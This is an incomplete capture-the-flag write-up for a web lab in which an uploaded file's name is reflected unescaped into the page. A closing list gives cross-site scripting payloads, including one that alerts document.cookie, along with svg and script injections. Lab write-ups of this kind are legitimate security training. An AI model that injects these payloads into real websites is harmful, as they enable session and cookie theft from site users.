# Write Up

## Challenge name
File Names Are Also Vulnerable!
https://labs.hacktify.in/HTML/html_lab/lab_3/index.php

## Category
Category...

## description
- go to the url
- there is a form that lets you upload files
- it consinst of
  - a button to choose a file, a button "File upload" to submit  your file

## solution
- submiting a file "myfile.txt"
- returns a confirmation and a text below the form
```
<h2>
  File Uploaded 
  <b>amlo.txt</b>
</h2>
```
- adding tags to the name


## flag
```
flag{}
```
<details>
  <summary>Example</summary>

  ```
  long console output here
  ```
</details>

scripts
```

?user=mytext</b>"<img+src=x+onerror=alert(document.cookie)>



?user=mytext</b>"<script>window.open('https://www.google.com')</Script>

</b>"<Svg onclick="window.open('https://www.google.com', '_blank')"></svg>

mytext</b>"<Svg onclick=alert(system("ls"))></svg>
```